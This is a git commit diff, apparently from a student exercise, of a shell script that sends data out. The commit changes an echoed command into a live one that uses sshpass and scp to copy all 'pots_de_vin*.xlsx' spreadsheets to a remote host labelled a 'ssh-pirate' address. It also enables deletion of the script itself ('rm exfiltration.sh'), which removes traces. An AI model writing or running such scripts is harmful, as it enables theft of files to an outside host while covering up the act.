0c40e53f93a6d13712386f6fd61b1f2a943a038e
amineAUPEC <79785242+amineAUPEC@users.noreply.github.com>
2021-07-02 17:01:44 +0200

    1701

--- scp_transf.sh
+++ scp_transf.sh
@@ -6,10 +6,10 @@ Ip="177.16.1.4" # adresse de ssh-pirate
 command=$(ls pots_de_vin*.xlsx)
 for files in $command
 do
-    echo "sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data"
+    sshpass -p "$password" scp $files $username@$Ip:/home/etudiant/data
 done
 
-# rm exfiltration.sh
+rm exfiltration.sh
 
 
 # scp file1 file2 more-files* user@remote:/some/dir/
